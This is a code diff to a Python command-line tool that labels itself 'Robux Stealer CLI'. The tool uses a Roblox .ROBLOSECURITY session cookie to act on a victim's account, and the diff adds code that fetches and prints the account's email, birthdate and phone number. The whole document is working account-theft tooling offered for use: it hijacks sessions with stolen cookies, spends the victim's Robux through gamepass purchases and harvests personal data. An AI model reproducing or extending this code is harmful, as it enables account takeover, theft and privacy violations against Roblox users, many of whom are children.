@@ -68,9 +68,10 @@ def buy_gamepass(url,cookie):
         print(f'Response text:', response.text)
         print(f'POST request failed with status code {response.status_code}')
 
-def get_roblox_data(cookie):
+def get_roblox_data(robloxcookie):
+    urls=['https://accountsettings.roblox.com/v1/email','https://accountinformation.roblox.com/v1/birthdate','https://accountinformation.roblox.com/v1/phone']
     session = requests.Session()
-    session.cookies['.ROBLOSECURITY'] = cookie
+    session.cookies['.ROBLOSECURITY'] = robloxcookie
 
     req = session.post(
         url='https://auth.roblox.com/'
@@ -107,6 +108,16 @@ def get_roblox_data(cookie):
     else:
         print(f'Response text:', response.text)
         print(f'GET request failed with status code {response.status_code}')
+
+    headers = {
+        'X-CSRF-TOKEN': session.headers.get('X-CSRF-Token'),
+        'Content-Type': 'application/json; charset=utf-8',
+    }
+
+    for item in urls:
+        data=session.get(item,headers=headers).json()
+        for item,key in data.items():
+            print(item,':',key)
 
 print('\033[31mRobux Stealer CLI   \033[0m')
 print('\033[34m [+]Buy Gamepass (1) \033[0m')
